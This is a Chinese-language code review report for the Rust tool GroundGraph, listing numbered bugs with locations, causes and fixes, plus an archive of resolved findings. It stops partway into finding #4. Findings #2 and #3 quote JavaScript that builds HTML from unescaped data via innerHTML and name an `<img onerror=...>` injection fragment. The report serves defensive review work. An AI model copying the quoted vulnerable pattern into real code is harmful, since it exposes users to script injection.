- **问题**：写临时文件后**未 `file.sync_all()`** 就 `persist`，rename 后**未对父目录 `fsync`**。崩溃/掉电窗口内：rename 可能先于数据落盘，留下 0 字节或截断的目标文件；目录项也可能未持久化。这违背"原子写"通常承诺的耐久语义（rename 只保证不出现"半旧半新"，不保证内容已落盘）。
- **触发场景**：`groundgraph index` 写 `graph.db` 旁的 manifest/导出/stats 期间断电或 OOM kill。
- **建议**：`persist` 前 `tmp.as_file().sync_all()`；rename 后打开父目录 `File::open(parent)?.sync_all()`（Unix）。若刻意为性能放弃 fsync，应在 doc 明确"非耐久"。

### 245. OOM 大小门（#186）未铺全：`read_node_source` 等热点直接 `read_to_string` 无 `is_oversized_source`

> **🔴 待修复（Medium，OOM）** — #186 只覆盖了 lsp/docs/treesitter，遗漏多个 fact 抽取入口。

- **位置**：`crates/groundgraph-engine/src/source_text.rs`（`read_node_source`）；`similarity.rs`（结构指纹读全文件）；`dart_indexer.rs`；`data_contract.rs`——均直接 `std::fs::read_to_string` 无大小检查
- **问题**：`fulltext_indexer.rs` 已用 `is_oversized_source` 守门（#186），但 `read_node_source` 是 `symbol_facts`/`constants`/`business_pack` 等多模块的共享读入口，对超大/二进制误纳入的文件会一次性读进内存。生成文件、误配 `code.paths`、vendored 大文件都可能触发。
- **建议**：在 `read_node_source` 及上述直读处统一接入 `is_oversized_source`（或共享一个 `read_source_capped`），超限返回 None 并记跳过原因，和 #186 行为对齐。

### 246. `docs_indexer::parse_markdown` 不跟踪 ``` 代码围栏：代码块内 `#` 行被当作标题，生成幽灵 `DocSection`

> **🔴 待修复（Medium，正确性）** — 同仓 `parse_requirements`（`requirements_md_indexer.rs:303-316`）与 `parse_adoc` 都已正确跟踪围栏，唯独此处没有。

- **位置**：`crates/groundgraph-engine/src/docs_indexer.rs`（`parse_markdown` 对每行 `trim_start()` 后调 `parse_heading`，无 `in_fence` 状态）
- **问题**：Markdown 文档里围栏代码块（```` ``` ````/`~~~`）或 4 空格缩进块内，凡以 `#` 起头的行（shell 注释、Python 注释、YAML `#`、示例 Markdown）都会被识别成标题，凭空造出 `DocSection` 节点，污染 docs 图、搜索结果与需求映射目标。`trim_start()` 先行也使缩进代码块同样中招。
- **触发场景**：任何含 shell/YAML/Markdown 代码示例的 `docs/*.md`。
- **建议**：照搬 `parse_requirements` 的 `in_fence` 翻转逻辑（遇 ``` `````` ````/`~~~` 切换、围栏内整段跳过）。

### 247. `impact`：`any_test_changed` 仅对 Dart 测试置真 → 非 Dart 仓"改码未改测试"告警系统性误报

> **🔴 待修复（Medium，跨语言正确性）** — 工具已支持 10+ 语言，但此门控写死 Dart。

- **位置**：`crates/groundgraph-engine/src/impact.rs:184-188`（`is_dart && is_test_file` 才置真）、`:398-407`（据此发 `missing_test_change` 告警）
- **问题**：`any_test_changed` 仅当 `file.path.ends_with(".dart") && is_test_file` 才为真。对 Go/Rust/Python/TS/Java 仓，**即便本次 PR 确实改了测试**，该标志仍为假 → 触发"受影响需求有关联测试但本次未改测试"告警。该告警默认 `warning` 级，构成所有非 Dart 项目的常态误报。
- **建议**：用语言无关的测试判定（图里已有 `TestCase`/`TestGroup` 节点，或统一的 `is_test_path`）替换 `is_dart && …`。

### 248. `impact::is_test_file` 仅认 `test/`：漏 `tests/`、`_test.go`、`test_*.py`、`*.test.ts` 等约定

> **🔴 待修复（Medium，跨语言正确性）** — 与 #247 同源但独立：判定函数本身过窄。

- **位置**：`crates/groundgraph-engine/src/impact.rs:185`（`path.starts_with("test/") || path.contains("/test/")`）
- **问题**：仅匹配 `test/` 目录子串。漏掉：Rust `tests/` 复数目录与 `#[cfg(test)]` 内联；Go `xxx_test.go`（无 test 目录）；Python `test_*.py`/`*_test.py`（常在 `tests/`，`/test/` 子串也不匹配 `/tests/`）；JS/TS `*.test.ts`/`*.spec.ts`。连 Dart 的 `tests/`（复数）也漏。
- **建议**：实现语言感知的 `is_test_path`（后缀 + 目录名 + 文件名模式），并在 #247 复用。

### 249. `lsp_client::read_message` 帧头按 `read_line` 读、无长度上限 → 恶意/损坏 LSP server 可致 OOM

> **🔴 待修复（Medium-Low，OOM）** — body 有 `MAX_FRAME_BYTES`，header 没有；MCP 侧 #107 已修同类问题但未推广到 LSP。

- **位置**：`crates/groundgraph-engine/src/lsp_client.rs`（`read_message` 的 header 解析循环 `reader.read_line(&mut header)`）
- **问题**：消息体受 `MAX_FRAME_BYTES` 限制，但读 `Content-Length:` 等头部用 `read_line` 且无上限。一个不发换行、持续吐字节的服务器会让 `header` 无限增长直至 OOM。对照 MCP pump 的 `read_line_capped`+`MAX_LINE_BYTES`（#107）。
- **触发场景**：第三方 LSP/sourcekit-lsp 异常或被构造的恶意 server。
- **建议**：header 行改用带上限的读取（如 #107 的 `read_line_capped`），超限报错断开。

### 250. `stats.jsonl` 仅追加无轮转/封顶，`load_stats` 全量读入 `Vec` → 无界增长

> **🔴 待修复（Medium-Low，资源）** — 与 #107/#88/#186 的 OOM 防御意识不一致。

- **位置**：`crates/groundgraph-engine/src/stats.rs:101-116`（`append_stat`）、`:120-138`（`load_stats`）
- **问题**：每次 CLI 调用都向 `.groundgraph/stats.jsonl` 追加一行，**永不轮转/截断**；`groundgraph stats` 经 `load_stats` 把整个文件读进 `Vec<CommandStat>` 再聚合。CI/nightly 高频跑 `index/search/impact` 会让该文件单调膨胀，最终拖慢甚至撑爆 `stats` 聚合。
- **建议**：按行数/字节数封顶（保留最近 N 行）或加日期轮转；`load_stats` 流式聚合，避免一次性全量读。

### 251. `EdgeAssertion::declared` 用 `edge::{kind}::{from}::{to}` 拼 ID：`from`/`to` 含 `::` 时不同边可碰撞同一 ID

> **🔴 待修复（Medium，正确性）** — 与 #63（confidence 净化）不同面，属 ID 唯一性。

- **位置**：`crates/groundgraph-core/src/edge.rs`（`declared`/`fact`：`ArtifactId::new(format!("edge::{}::{}::{}", kind, from, to))`）
- **问题**：分隔符 `::` 未转义，而 `ArtifactId` 本身（如 `dart_method::lib/a.dart#A.b`）就含 `::`。于是 `(from="x::y", to="z")` 与 `(from="x", to="y::z")` 在同 kind 下生成完全相同的 edge id，后写覆盖先写，丢边/串边。
- **触发场景**：任意两个节点 id 的 `::` 切分点不同但拼接后相同——真实 id 普遍含 `::`，碰撞概率不可忽略。
- **建议**：改用不可能出现在 id 中的分隔策略（如对 from/to 做长度前缀或 hash，或用 `\u{1f}` 等控制符分隔），并加碰撞回归测试。

### 252. `symbol_facts` 把 `unwrap`/`expect` 计入 `THROW_WORDS` → 惯用 Rust 代码纯度/throws 统计虚高

> **🔴 待修复（Low-Medium，启发式准确性）**

- **位置**：`crates/groundgraph-engine/src/symbol_facts.rs:316-325`（`THROW_WORDS` 含 `"unwrap"`/`"expect"`）、`:78`（doc 也如此声明）、`:349`/`:578`（计数与打 `throw` 标签）
- **问题**：`.unwrap()`/`.expect()` 是 Rust 最常见的惯用法，连纯函数（如 `self.x.as_ref().unwrap()`）也会被记 `throws` 并打 `throw` 标签，污染 `counts.throws` 与 `explain`/business 输出。把语言无关的"throw 词表"套到 Rust 上偏差明显。
- **建议**：按语言区分 throw 词表；Rust 的 `unwrap`/`expect` 单独归为"may-panic"信号而非 `throw`，或仅在非 Rust 节点计入。

### 253. `proc::kill_tree` 在子进程已被收割后重复调用，`child.id()` 旧 PID 可能已被 OS 复用 → 误杀无关进程组

> **🔴 待复核（Low，并发/进程）** — 低概率但真实的 PID-reuse 竞态。

- **位置**：`crates/groundgraph-engine/src/proc.rs`（`kill_tree` 用 `child.id()` 执行 `kill -KILL -<pgid>`）
- **问题**：若某 child 已 `wait`/reaped，其 PID 进入可复用池；此后再次 `kill_tree`（如 Drop 与显式 shutdown 双触发）用同一旧 PID 组发 SIGKILL，可能命中复用该 PID 的无关进程/进程组。
- **建议**：reaped 后把 child 置位（`Option::take`），`kill_tree` 对已收割对象早返回；避免对同一 child 多次组杀。

### 254. `commit_bulk`：`COMMIT` 失败仅恢复 autocheckpoint，不 `ROLLBACK` → 事务残留，下次 `begin_bulk` 静默并入旧事务

> **🔴 待复核（Low，事务一致性）** — 延续 #218 的边界。

- **位置**：`crates/groundgraph-store/src/lib.rs`（`commit_bulk` / `begin_bulk`）
- **问题**：`COMMIT` 返回 `SQLITE_BUSY` 等错误时连接仍处于事务中，但代码未尝试 `ROLLBACK`。`begin_bulk` 又在已有活动事务时静默变 no-op（不报错），于是下一批写入悄悄并进上一批未决事务，提交/回滚边界错乱。
- **建议**：`COMMIT` 失败后尝试 `ROLLBACK` 并把连接复位；`begin_bulk` 检测到已有事务时返回错误或显式记录，而非静默 join。

### 255. `slugify`：纯 ASCII 仅标点差异的文本生成相同 slug 且无 hash 后缀（碰撞）

> **🔴 待复核（Low，正确性）** — #203 已为含非 ASCII 的情况加 hash 后缀，但纯 ASCII 标点差异未覆盖。

- **位置**：`crates/groundgraph-core/src/artifact_id.rs`（`slugify`：`out.is_empty()` → hash；`has_non_ascii` → 附 hash；否则**直接返回 `out`**）
- **问题**：`"Hello, World!"` 与 `"Hello World"` 都归一化为 `hello-world`，两者都是纯 ASCII 且非空，走"直接返回"分支，无 hash 区分 → slug 碰撞。需求/文档标题仅标点不同就会撞 id。
- **建议**：当归一化丢弃了字符（`out` 无法无损还原原文）时，对纯 ASCII 也附 `fnv1a64` 后缀，与非 ASCII 分支一致。

### 256. `symbol_facts`：SQL 关键字 IO 标记在 `strip_noise` 清空字符串字面量后基本失效

> **🔴 待复核（Low，启发式准确性）**

- **位置**：`crates/groundgraph-engine/src/symbol_facts.rs:448-478`（`IO_MARKERS` 含 `"SELECT "`/`"INSERT "`/`"UPDATE "`/`"DELETE "`）、`strip_noise`（先清空字符串内容）
- **问题**：SQL 语句几乎总以字符串字面量出现（`db.query("SELECT …")`），而纯度检测在匹配 IO 标记**之前**已 `strip_noise` 把字符串内容清空，导致 `SELECT `/`INSERT ` 等标记几乎永不命中；真正起作用的只有 `.query(`/`execute(` 这类调用语法标记。词表里的 SQL 动词形同摆设，给人"已检测 SQL"的错觉。
- **建议**：要么在清空字符串前先扫一遍 SQL 动词，要么移除失效的 SQL 词表、明确以调用点标记为准（并更新注释）。

### 257. `python_frameworks::first_string_arg`：空路由 `("")` 回带引号 `""`；路径含逗号（regex 路由）被 `split(',')` 截断

> **🔴 待复核（Low，启发式准确性）**

- **位置**：`crates/groundgraph-engine/src/python_frameworks.rs:372-387`（`first_string_arg`）、`:423-430`（`strip_quotes`）
- **问题**：(1) `inner.split(',').next()` 只取第一个逗号前的内容，Django `re_path(r'^x{1,3}/$')` 之类含 `{m,n}`/逗号的正则路由会被从逗号处切断，`strip_quotes` 因引号不配对而原样返回半串。(2) `@app.route("")` 时 `strip_quotes` 得空串，命中 `value.is_empty()` 分支按"非字面量"原样返回 `""`（带引号），空路由被报成带引号字符串而非真正空路径。
- **建议**：用更稳的"取第一个完整字符串字面量"解析（识别配对引号、跳过引号内逗号）；空字符串字面量显式返回空串并标记为字面量。

### 258. `dart_sidecar::command_from_str`：`shlex` 把以 `#` 开头的覆盖值当注释 → 返回空、静默回退裸 `dart`

> **🔴 待复核（Low，配置健壮性）**

- **位置**：`crates/groundgraph-engine/src/dart_sidecar.rs`（`command_from_str`，`GROUNDGRAPH_DART_ANALYZER_BIN` 经 `shlex::split`）
- **问题**：`shlex::split` 视 `#` 为注释起始。若用户把 `GROUNDGRAPH_DART_ANALYZER_BIN` 设成 `#!/path` 或 `#comment` 之类，`split` 返回空 vec，代码静默回退到裸 `dart`（不带 sidecar 脚本参数），掩盖了配置错误，难排查。
- **建议**：`shlex::split` 得到空/`None` 时报错或告警（"覆盖值解析为空"），不要静默吞掉。

### 259. Dart 解析器 `update_depth`：字符串插值 `${…}` 与嵌套引号致花括号深度计数失准

> **🔴 待复核（Low，解析鲁棒性）** — 轻量行解析器的已知局限，但会错判符号体边界。

- **位置**：`crates/groundgraph-lang-dart/src/parser.rs`（`update_depth`）
- **问题**：逐字符数 `{`/`}` 时未正确处理 Dart 字符串插值 `"${expr}"` 与插值内嵌套引号（`"${m["k"]}"`）。插值里的 `{`/`}` 会被错误计入深度，或嵌套引号让"是否在字符串内"判断翻转，导致 brace 深度漂移、符号体起止行错位。
- **触发场景**：含插值表达式（尤其内部带 `{}`/引号）的 Dart 方法体。
- **建议**：在字符串扫描状态机里识别 `${` 进入表达式态、`}` 退出，并正确处理插值内的引号层级；或在文档中标注该局限并以 `SymbolRange` 兜底。

### 260. `feature_map`：`external_refs.min(20)` 后 `try_from(...).unwrap_or(20)` 与 BFS `depth < prev_dist` 均为死分支

> **🟡 吹毛求疵（Nit）**

- **位置**：`crates/groundgraph-engine/src/feature_map.rs:198`（`u32::try_from(external_refs.min(20)).unwrap_or(20)`）、`:245`（`*prev_idx == cluster_idx && depth < *prev_dist`）
- **问题**：(1) `min(20)` 后值恒 ≤20，`try_from::<u32>` 不可能失败，`unwrap_or(20)` 是死兜底。(2) 每个 `cluster_idx` 在 `enumerate` 中只跑一次 BFS，且 BFS（FIFO）首次出队即最短距离，故"同簇且更短距离覆盖"条件永不成立——该分支为死代码。
- **建议**：(1) 用 `as u32`（已显式 clamp）或 `unwrap_or(u32::MAX)` 以表意；(2) 删除不可达的 `depth < prev_dist` 分支或加注释说明保留原因。

### 261. `symbol_facts::propagate_impurity`：worklist 循环内 `callers.clone()` 多余分配

> **🟡 吹毛求疵（Nit，微优）**

- **位置**：`crates/groundgraph-engine/src/symbol_facts.rs`（`propagate_impurity` 的不动点传播循环）
- **问题**：每次从 worklist 弹出节点都对其 `callers` 列表做一次 `clone()` 再遍历，纯粹为绕过借用检查；在调用图稠密时是无谓的堆分配。
- **建议**：用索引遍历或先收集需入队的 id 再统一处理，避免每轮 clone。

### 262. 多处 `split/rsplit(...).next().unwrap_or(x)` 死兜底（`split` 必产 ≥1 元素）

> **🟡 吹毛求疵（Nit）**

- **位置**：例如 `crates/groundgraph-engine/src/network.rs:90`、`rust_treesitter.rs:172`（`rsplit('/').next().unwrap_or(dir)`），以及若干 `OffsetDateTime::format(Rfc3339).unwrap_or_else(...)`（见 #267）
- **问题**：`str::split`/`rsplit` 对任意输入（含空串）迭代器首元素必存在，`.next()` 恒为 `Some`，`unwrap_or` 的兜底分支不可达，易误导读者以为存在空输入路径。
- **建议**：改用更直白的写法或加注释说明兜底不可达；统一这一模式。

### 263. `resolve_storage_path` 在 4 个文件各自重复实现（DRY；亦是 #242 的根因放大）

> **🟡 吹毛求疵（Nit，DRY）**

> **✅ 已闭环（2026-07-17，TDD）** — DRY 收敛完成：全仓实测 22 份 storage/db 路径解析副本（20 份 engine 模块 shim + engine canonical + MCP `resolve_db_path`）收敛为 `groundgraph_core::paths::confine_under_root` 单一实现加 `config::resolve_storage_path` 唯一包装，副本数 22 → 1；#242 的"无单一实现点"根因放大器同步消除。

- **位置**：`crates/groundgraph-engine/src/{index.rs, schema_indexer.rs, connect.rs:562, network.rs}` 各有一份近乎相同的 `resolve_storage_path`
- **问题**：同一"解析 storage.path"逻辑被复制 4 份，彼此可能漂移；#242 的路径约束缺口正因为没有单一实现点而需要逐处修。
- **建议**：收敛为 `config`/公共模块的单一函数（含 #242 的 `confine_under_root`），各处调用。

### 264. `requirements_md_indexer::parse_requirements` 允许跨文件重复需求 ID，下游静默后写覆盖/双节点

> **🔴 待复核（Low，正确性/设计）**

- **位置**：`crates/groundgraph-engine/src/requirements_md_indexer.rs`（`parse_requirements` 不校验跨文件 ID 唯一）
- **问题**：单文件内重复 H1 会各自成段，但**跨文件**同一 `REQ-xxx` 不告警；若调用方按 id 建 Requirement 节点，后写覆盖先写（丢映射）或产生两个同号需求，取决于上层 upsert 策略。需求号通常被期望全局唯一。
- **触发场景**：复制需求模板改编时忘记换号。
- **建议**：索引阶段收集全局 id，遇重复发 warning（指出冲突文件）并定义确定性的"保留/合并"策略。

### 265. `constants.rs` 字面量扫描把十六进制中的 `e`/`E` 误判为指数标记（无实际正确性影响）

> **🟡 吹毛求疵（Nit）**

- **位置**：`crates/groundgraph-engine/src/constants.rs`（数字字面量扫描的指数标记判定）
- **问题**：扫描浮点指数时对 `e`/`E` 的判定未排除十六进制上下文（`0xE3`、`0x1e`），会把 hex 里的 `e/E` 当指数标记。因后续分类仍把整体识别为数字字面量，分类结果不变，纯属内部判定瑕疵。
- **建议**：进入 `0x` 分支后不再触发指数逻辑；或标注此判定对结果无影响。

### 266. `graph.rs::build_graph_view`：`max_nodes` 在 `apply_view` 之前裁剪 → Business 视图可见节点数远小于 `max_nodes`

> **🟡 吹毛求疵（Nit，UX 语义）**

- **位置**：`crates/groundgraph-engine/src/graph.rs:359-377`（步骤 7 截断）→ `:380`（步骤 8 `apply_view` 才置 `default_visible`）
- **问题**：先按优先级截到 `max_nodes`，再由 `apply_view` 把大量节点标记为不可见。于是 `--max-nodes 50` 的 Business 视图最终可见可能远少于 50，用户预期与结果不符（`max_nodes` 实为"模型上限"而非"可见上限"）。
- **建议**：要么文档明确 `max_nodes` 限模型规模；要么先 `apply_view` 再按可见集截断。

### 267. 多处时间格式化 `OffsetDateTime::format(&Rfc3339).unwrap_or_else(...)` 等死兜底

> **🟡 吹毛求疵（Nit）**

- **位置**：例如 `crates/groundgraph-engine/src/graph.rs:398-400`（`generated_at`）及其他 `format(&Rfc3339)` 调用点
- **问题**：对合法 `OffsetDateTime` 用 `Rfc3339` 格式化不会失败，`unwrap_or_else(|_| "1970-…")` 兜底不可达，属防御性死代码（与 #262 同类）。
- **建议**：保留无妨，但可统一加注释或抽 helper，避免读者误判存在格式化失败路径。

### 268. `scip_runner` 的 `writes_cwd_index`（Dart `scip_dart`）信任 repo 根固定名 `index.scip`：预存/陈旧文件被误移、并发竞争

> **🔴 待复核（Medium-Low，正确性/安全）**

- **位置**：`crates/groundgraph-engine/src/scip_runner.rs:558-561`（成功后 `rename(cwd.join("index.scip"), out)`）
- **问题**：`scip_dart` 忽略 `--output`、固定向 cwd（= repo 根）写 `index.scip`，runner 据此把 `cwd/index.scip` 移到目标。隐患：(1) 若仓库根**已存在**用户自己的 `index.scip`（提交物/他工具产物），它会被 `rename` 移走/吞掉；(2) 若本次 `scip_dart` 实际没产出而旧 `index.scip` 残留，`produced.exists()` 为真 → 陈旧数据被当新结果摄入；(3) 同一仓库并发两次 `index` 竞争同名文件。
- **建议**：在隔离临时 cwd 运行 `scip_dart`，从该临时目录取 `index.scip`；或运行前校验/清理目标名，避免触碰 repo 根的同名文件。

### 269. `scip_runner` 测试 `set_var`/`remove_var` 无 `ENV_LOCK`：与已修的 #65 同类进程级 env 竞态（UB）未被清扫

> **🔴 待复核（Low，测试卫生）**

- **位置**：`crates/groundgraph-engine/src/scip_runner.rs:879-914`（测试设/删 `GROUNDGRAPH_SCIP_PYTHON_BIN`）
- **问题**：该测试 `std::env::set_var` 后 `remove_var`，无任何串行化锁；同一 engine lib 测试二进制内其他测试会经 `env_override_for`（`:150-151`）/PATH（`:329`）读环境变量。`cargo test` 默认并行下，set/remove 与 read 并发即触发 Rust 1.81+ 标注的 env UB——正是 #65 为 Dart golden 测试修掉的同一类问题，但本处未被同批清扫。
- **建议**：复用 #65 的共享 `ENV_LOCK`/串行 helper 保护这些 env 改写；或改用注入式探针（如本文件多数测试已用的 `plan_with`）避免真实 env。

### 270. `git_diff::parse_unified_diff` 漏处理纯重命名/拷贝：旧路径被丢、状态记为 `Modified`；重命名头含空格时路径为空

> **🔴 待复核（Low-Medium，正确性）**

- **位置**：`crates/groundgraph-engine/src/git_diff.rs:70-121`（`parse_unified_diff` / `parse_b_path`）
- **问题**：默认开启 rename 检测时，100% 相似的纯重命名只产生 `diff --git a/old b/new` + `rename from/to`，**无 `+++`/`@@`**。解析器只从 `diff --git` 取 b-path、状态留 `Modified`、hunks 为空：(1) **旧路径 `old` 被完全丢弃**，任何锚定在旧路径上的需求/边都不会被 `impact` 标记受影响；(2) 同理 `copy from/to` 被忽略；(3) 若重命名头路径含空格，`parse_b_path` 的 `split_whitespace` 失败，且无 `+++` 行可兜底 → `path` 为空字符串。
- **触发场景**：PR 含文件重命名/移动（重构常见）。
- **建议**：解析 `rename from`/`rename to`（及 `copy from/to`）显式产出旧→新两条信息，状态标 `Renamed`；对含空格路径优先用 `rename to`/`+++` 的整行剩余而非按空格切分。

### 271. 子进程超时杀树后 join 读取线程：组外孙进程持有管道 → 超时分支永久挂起（ubuntu CI 实锤）

> **✅ 已闭环（2026-07-18，TDD）** — 成立（High，生产可触发）。CI 在 ubuntu 装 Dart SDK 后 `cargo test` 挂起 44 分钟（macOS 正常）：`dart_sidecar::try_run` 与 `scip_runner::run_with_capped_stderr` 的超时分支在 `kill_and_reap` 后**无条件 `join()` 读取线程**——读取线程阻塞在管道 `read_to_end`，而逃逸进程组的孙进程（dartdev/analysis_server 这类会重新 setsid 的守护进程）持有管道写端不关，EOF 永不到达，join 卡死、预算机制完全失效。修复：杀树后给 200ms 排水宽限，`is_finished()` 才 join，否则携带错误直接返回（错误路径泄漏一个阻塞读线程，远好于卡死整个 indexer）。TDD 复现测试 `try_run_timeout_does_not_hang_when_a_grandchild_holds_the_pipes`：桩 sidecar fork 一个 `os.setsid()` 孙进程持管，修复前精确卡住 60s（孙进程全程），修复后 1.25s 按预算返回。`scip_runner` 同模式两处（超时 + try_wait 错误分支）一并修。

- **位置**：`crates/groundgraph-engine/src/dart_sidecar.rs`（try_run 超时分支）、`crates/groundgraph-engine/src/scip_runner.rs:780-795`
- **发现**：v0.3.0 发布后 ubuntu CI（装 Dart SDK 跑 Dart 金标）挂起；与 #68（孙进程孤儿）同源——#68 修了"杀"，本条是"杀完等管道"的下半截。

---

## 归档附录（已闭环问题）

> 以下为已闭环问题的完整审查记录与 verdict（修复 / 误报 / 按设计 / 已被覆盖）。活跃问题见本文件前半部分。


# GroundGraph 代码审查报告

**审查时间**：2026-06-12
**审查范围**：crates/* 全部 src 文件（约 91,680 行 Rust 代码）
**审查方法**：5 个并行 agent 按模块分工（core+store / engine 算法 / engine 数据流 / cli / dart+mcp），主审查交叉验证关键发现
**项目约束基线**：AGENTS.md、CONTRIBUTING.md（不允许 unsafe、非侵入式只写 `.groundgraph/`、零 clippy 警告、测试驱动）

共记录 30 个问题。严重度分级：**High**（生产可触发，影响数据/安全）、**Medium**（边界条件或显著性能/设计缺陷）、**Low**（性能微优化或潜在隐患）。

---

## 处理结果（2026-06-12 复核）

每个问题先经源码复核，确认存在的按 TDD（先失败测试、后修复）处理；全量 `cargo test --workspace` 与 `cargo clippy --all-targets` 通过。

| # | 结论 | 处理 |
|---|------|------|
| 1 | 确认 | `sanitize_for_script` / `sanitize_json_for_script` 改为 UTF-8 安全的 `replace("</", "<\\/")`，新增中文/emoji 回归测试 |
| 2 | 确认 | `repaintEdgeDetail` / 解析错误兜底 / 头部统计全部改为 DOM 构建 + `textContent`，新增"innerHTML 禁止拼接"不变量测试 |
| 3 | 部分成立 | `escapeText` 原本已覆盖，属防御性问题；补 `escapeAttr(e.layer)`、`escapeAttr(classes)`、统计行 DOM 化 |
| 4 | 确认 | `clear_indexer_outputs` 增加孤立 `node_fts` 行清理（先测后修） |
| 5 | 确认 | `update_depth` / `strip_strings_and_comments` 改为带 `escaped` 状态机，正确处理 `\\` 与 `\"` |
| 6 | 确认 | `parse_import` / `extract_call_arg` 改用 `find_unescaped` 找未转义引号 |
| 7 | 确认 | `scan_identifiers` 改为 `char_indices()`，杜绝多字节切片 panic |
| 8 | 误报 | MCP stdio 传输规范即为换行分隔 JSON-RPC，无需 `Content-Length` 帧（LSP 才需要） |
| 9 | 确认 | `get_subgraph` BFS 增加 `depth≤16`、节点 2000、边 8000 预算；超限时响应带 `"truncated": true`，新增密集图测试 |
| 10 | 确认 | Java 实体解析改用 `brace_counts_outside_strings`（跳过字符串/字符字面量与 `//` 注释） |
| 11 | 确认 | `balanced_parens` 增加字符串字面量与转义跟踪 |
| 12 | 确认 | 簇分数不再依赖"已发现的对"，对簇内全部成员重算 pairwise simhash，报告真实 worst-case |
| 13 | 按设计 | `normalize` 对未闭合注释/字符串静默 EOF 是对损坏输入的容错启发式，不改 |
| 14 | 确认 | `scip_runner` 改为 `run_with_capped_stderr`：stdout 重定向 null，stderr 只保留 64 KiB 前缀并持续排水防死锁 |
| 15 | 政策澄清 | 显式 `--output` 是用户意图的逃生门，不算非侵入违规；已在 CLI 帮助文本写明（省略时只写 `.groundgraph/`） |
| 16 | 确认 | `escape_label` 改为 Mermaid HTML 实体（`#quot;`/`#lt;`/`#gt;`/`#124;`，`#35;` 最先替换） |
| 17 | 确认 | 新增共享 `commands/output.rs::write_atomic`（同目录临时文件 + rename），7 处输出全部接入 |
| 18 | 确认 | `ALL_KINDS` 改用 `NodeKind::ALL` 单一事实来源，断言总数 82 |
| 19 | 确认 | 批量 upsert 改 `values_placeholders` + `execute_chunk`（满块 `prepare_cached`、尾块 `prepare`） |
| 20 | 确认 | `EvidenceKind`/`EdgeKind`/`EdgeSource`/`EdgeCertainty`/`EdgeStatus` 增加 `ALL` + `from_str`，store 解析全部改用 |
| 21 | 确认 | 三个批量 upsert 包进 `with_write_tx` 事务 |
| 22 | 确认 | `search_aliases` 按 `is_method()`/`is_free_function()` 动态派生，覆盖全部语言 |
| 23 | 重新评估 | PRAGMA 全部改为逐条 best-effort 执行（受限环境下任一失败不影响其余） |
| 24 | 确认 | 兜底转义提取为 `escape_json_string`（引号/反斜杠/控制字符），保证单行有效 JSON |
| 25 | 确认 | `shutdown()` 在 child 已被 force-kill 后直接成功返回，不再向死管道写入 |
| 26 | 确认 | `backfill_referenced_symbols` 改 `HashMap` 索引，O(R×S) → O(R+S) |
| 27 | 确认 | 注释修正：预算实为 15s（为 sourcekit-lsp 冷启动留量），并删除不存在的常量引用 |
| 28 | 确认 | `docs_indexer` 的 `visited` 改 `BTreeSet`，三处线性查找消除 |
| 29 | 确认 | 8 个读路径改 `prepare_cached` |
| 30 | 误报 | `append_stat` 已有目录存在性守卫，不会在缺失 `--repo-root` 时写盘 |

---

## High（4 个）

### 1. HTML 报告 `sanitize_for_script` 按字节处理 UTF-8，多字节字符被损坏

- **位置**：`crates/groundgraph-cli/src/commands/search_html.rs:39-54`，同样问题在 `crates/groundgraph-cli/src/commands/graph_html.rs:44-55`
- **问题**：函数逐字节遍历 JSON 字符串，对每个字节执行 `out.push(b as char)`。对 UTF-8 多字节字符（中文 symbol 名、中文注释、中文路径），每个续字节（0x80–0xBF）会被零扩展为 U+0080–U+00FF 的 Latin-1 字符，再被 `String::push` 重新编码为 2 字节 UTF-8。结果：一个 3 字节的中文（如 `中` = `E4 B8 AD`）会被错误展开为 6 字节的乱码 `Ã¤Â¸­`，前端 `JSON.parse` 得到错误字符串，搜索/graph 报告在含任何非 ASCII 字符时即损坏。
- **触发场景**：任何含中文/日文/韩文/emoji 的 symbol 名、文档片段、路径出现在 HTML payload 中——GroundGraph 主要面向中文用户场景，触发概率极高。
- **建议**：在字节层只替换 `</` → `<\/`，其余应原样 `push_str` 整段非 ASCII 切片（或直接用 `str::replace("</", "<\\/")`）。
```rust
// search_html.rs:42-53
let bytes = raw.as_bytes();
let mut i = 0;
while i < bytes.len() {
    let b = bytes[i];
    if b == b'<' && i + 1 < bytes.len() && bytes[i + 1] == b'/' {
        out.push_str("<\\/");
        i += 2;
        continue;
    }
    out.push(b as char);  // ← 对 0x80+ 字节会损坏
    i += 1;
}
```

### 2. `search_html.rs` 客户端 JS 使用 `innerHTML` 直接拼接 graph 数据

- **位置**：`crates/groundgraph-cli/src/commands/search_html.rs:985-986`
- **问题**：`repaintEdgeDetail` 用 `innerHTML` 拼接 `row.edge_kind` 和 `row.neighbor_kind`，这些值来自后端 graph 数据（symbol 名 / 边类型 / 节点 label），未在前端做 HTML 转义。GroundGraph 索引源代码注释、文档片段、MyBatis SQL 文本时，若这些字符串包含 `<img onerror=...>` 等 HTML 标签，会经 JSON payload 传到前端后被 `innerHTML` 渲染执行。
- **触发场景**：被索引的代码注释或文档中包含 HTML 片段（在企业仓库、含示例 HTML 的 README、含 SQL 字符串的 mapper.xml 中常见）。
- **建议**：所有动态文本走 `textContent`，或经统一的 `escapeHtml()` 注入。
```javascript
t.innerHTML = '<b>' + row.edge_kind + '</b> · ' + row.neighbor_kind;  // ← 两字段均未转义
```

### 3. `graph_html.rs` `edgeRow` 同样的 `innerHTML` 注入

- **位置**：`crates/groundgraph-cli/src/commands/graph_html.rs:686-687`
- **问题**：与 #2 同类问题。`escapeText` 只用在 `e.kind` 上，`otherLabel` 虽经 `escapeText` 但整体拼接进入含 `<span>` 的 `innerHTML` 字符串，模板里只要有任一字段遗漏 `escapeText` 即引入注入点。
- **触发场景**：同 #2。
```javascript
li.innerHTML = '<span class="arrow">' + (dir === 'in' ? '◀' : '▶') + '</span> ' +
  escapeText(e.kind) + ' — ' + escapeText(otherLabel);
```

### 4. `clear_indexer_outputs` 不清理孤立 FTS 行，搜索会返回幽灵节点

- **位置**：`crates/groundgraph-store/src/repositories.rs:420-441`
- **问题**：函数在事务中删除给定 indexer 的节点、边、孤立证据、孤立符号范围，**但未删除 `node_fts` 中引用已删除节点的全文行**。`node_fts` 表的 `node_id` 字段是 `UNINDEXED` 且无外键约束，因此已删除节点在 FTS 表中留下幽灵条目。下一次 `fulltext_match` 搜索可能命中已不存在的节点 id，下游 `find_node` 调用返回 `None`，导致搜索结果出现"命中但无法展开"的破损引用，或在 JOIN 后静默丢弃。
- **触发场景**：增量重索引（`groundgraph index` 在文件已变更后重跑）。若工作流跳过全文重建（例如只重索引子集），幽灵条目永久驻留。
- **建议**：在事务内追加 `DELETE FROM node_fts WHERE node_id NOT IN (SELECT id FROM nodes)`，或改用 FTS `external-content` 表 + 触发器同步。
```rust
// repositories.rs:420-441
